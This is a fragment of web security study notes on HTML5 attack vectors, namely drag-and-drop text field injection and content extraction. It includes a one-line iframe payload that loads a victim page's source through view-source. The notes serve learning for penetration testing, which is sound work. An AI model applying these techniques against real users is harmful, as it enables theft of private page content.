class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://blog.andlabs.org/2010/04/stroke-triggered-xss-and-strokejacking_06.html
+</code></pre><h2 id="15a33eb6-8518-44cf-a8d8-c77c81174520" class=""><strong>New Attack Vectors in HTML5</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#new-attack-vectors-in-html5"></a></strong></h2><p id="f34b94d8-947f-404c-9f75-64ea5dc09ae8" class="">Drag-and-Drop:</p><ul id="c8af2006-27bc-4511-9cac-7dc4e63668e1" class="bulleted-list"><li style="list-style-type:disc">With html5 this drag-and-drop mechanims has been transformed into something natively supported by all desktop-based browsers.</li></ul><h3 id="63c360d4-dfa5-4e3e-b7a6-9f7da2db64f8" class=""><strong>Text Field Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#text-field-injection"></a></strong></h3><p id="a28bea21-110a-4c4a-8cf4-f8a6cb073ba6" class="">The first technique allows the attacker-controller to drag data into hidden text fields/forms on different origins.</p><p id="b6169c0f-cdf1-4775-95c3-5282b183039d" class="">→ http://blog.kotowicz.net/2011/03/exploiting-unexploitable-xss-with.html</p><h3 id="16315f65-e64b-412b-95c8-1bf6ecf9b64c" class=""><strong>Content Extraction</strong><strong><a href="https://johnermac.github.io/notes/ewptx/html5/#content-extraction"></a></strong></h3><p id="896816ba-e6e1-499b-824e-4cfd40acd994" class="">Allow us to extract content from areas we cannot access. (restricted areas). In this scenario, we must trick the victim into dragging their private data into areas under our control.</p><ul id="0eb1e6d0-4650-4f46-9a86-fbc8c9f700aa" class="bulleted-list"><li style="list-style-type:disc">In order to trick the victim so we can extract content from the targeted web page, we must know what to extract and where it is located.</li></ul><p id="1a9ab682-e3a4-44d9-805f-2d89e2988d37" class="">If the secret is part of a URL, is an HTML anchor element or an image, dragging is easy. Cause the elements will be converted into a serialized URL.</p><ul id="c3039b06-90dc-424d-89fe-07c0074d294e" class="bulleted-list"><li style="list-style-type:disc">Its difficult when the content is not draggable like textual content. So we need to trick the victim to select first before dragging.</li></ul><p id="708e3ebc-e6c0-4d13-850d-8a32befc346a" class="">We could use the view-source: to load the HTML source code into an iframe.</p><p id="1d2fe698-cf24-4493-908e-1ae9a2a15195" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b3f6fcb2-6d7e-4442-b9c4-ac2a7bc7a31a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;iframe src=&quot;view-source:http://victim.site/secretInfo/&quot;&gt;&lt;/iframe&gt;
+</code></pre><blockquote id="7d9d8f5d-0fcb-43ba-8703-83dc530311b6" class="">however, this technique only works on Firefox, without the NoScript add-on.</blockquote></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
